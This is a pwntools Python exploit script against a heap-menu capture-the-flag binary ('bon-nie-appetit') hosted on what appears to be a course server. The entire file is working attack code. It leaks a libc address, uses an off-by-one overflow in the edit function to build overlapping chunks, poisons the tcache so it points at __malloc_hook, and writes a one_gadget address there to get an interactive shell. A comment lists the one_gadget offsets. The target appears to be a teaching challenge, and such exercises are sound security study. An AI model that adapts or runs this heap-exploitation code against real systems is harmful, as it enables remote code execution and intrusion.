from pwn import *
import pdb

def make_order(size, data):
    p.recvuntil(b'> ')
    p.send(b'1')
    p.recvuntil(b'many: ')

    # convert the int size to bytes, e.g. 248 -> b'248'
    p.send(str(size).encode())

    p.recvuntil(b'order: ')
    p.send(data)


def show_order(order_index):
    p.recvuntil(b'> ')
    p.send(b'2')
    p.recvuntil(b'order: ')
    p.send(str(order_index).encode())


def edit_order(order_index, new_data):
    p.recvuntil(b'> ')
    p.send(b'3')
    p.recvuntil(b'order: ')
    p.send(str(order_index).encode())
    p.recvuntil(b'order: ')
    p.send(new_data)


def delete_order(order_index):
    p.recvuntil(b'> ')
    p.send(b'4')
    p.recvuntil(b'order: ')
    p.send(str(order_index).encode())


#context.clear(arch-'amd64', log_level='debug'
context.clear(arch='amd64', log_level='info')

p = remote('cs4401shell2.walls.ninja', 15208)
#p = process('./bon-nie-appetit')
#log.info(f"Process ID: {p.id}")
sleep(1)

for x in range(11):
    make_order(0xF8, b'a' * 8)

for x in range(10):
    if x == 2:
        continue
    delete_order(x)

#pdb.set_trace()

make_order(0x168, b'b'*8)
show_order(0)

leak_raw = p.recv()[0x10+9:0x10+9+6] + b'\x00\x00'
leak_addr = unpack(leak_raw)
log.info("leak addr: " + str(hex(leak_addr)))


# calculate libc base address
adjustment = 0x7ffff7dcde90 - 0x007ffff79e2000
libc_base = leak_addr - adjustment
log.info("libc: " + str(hex(libc_base)))


# create order 1 (cccccccc)
make_order(0xF8, b'c'*8)

# create order 3 (dddddddd)
make_order(0xF8, b'd' * 0xF8)

# edit the D chunk, exploit the overflow in the edit function to modify
# the metadata of the C chunk. C chunk becomes size 0x180, now overlaps B chunk
log.info("Overflowing from D into C chunk")
edit_order(3, flat(b'd'*0xF8, b'\x81'))

log.info('Freeing c chunk')
delete_order(1)

log.info('Freeing B chunk, id 0')
delete_order(0)

# C chunk and B chunk are now only chunks in size 0x180 and 0x170 tcache bins, respectively

libc = ELF('./glibc/libc.so.6')
libc.address = libc_base

log.info('Malloc hook at: ' + str(hex(libc.symbols['__malloc_hook'])))

exploit_str = flat(b'/'*100, b'usr/bin/echo\x00', b'\x00'*100, length=0xF8)

make_order(0x178, flat(exploit_str, 0x101010101010101, libc.symbols['__malloc_hook']))

# allocate the last "real" 0x170 tcache entry (used to be b chunk)
make_order(0x168, b'eeeeeeee')


"""
one-gadget glibc/libc.so.6
0x4fa25 execve("/bin/sh", rsp+0x40, environ)
constraints:
    rsp & 0xf == 0
    rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
    [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
    [rsp+0x70] == NULL 

"""

log.info("creating second new order, should get the corrupted tcache entry that points to malloc hook")
# put pointer to one gadget in malloc hook)
make_order(0x168, flat(libc_base+0x10a2fc))

log.info('one more allocation to trigger malloc hook')
p.recvuntil(b'> ')
p.send(b'1')
p.recvuntil(b'many: ')
p.send(b'360')

p.interactive()


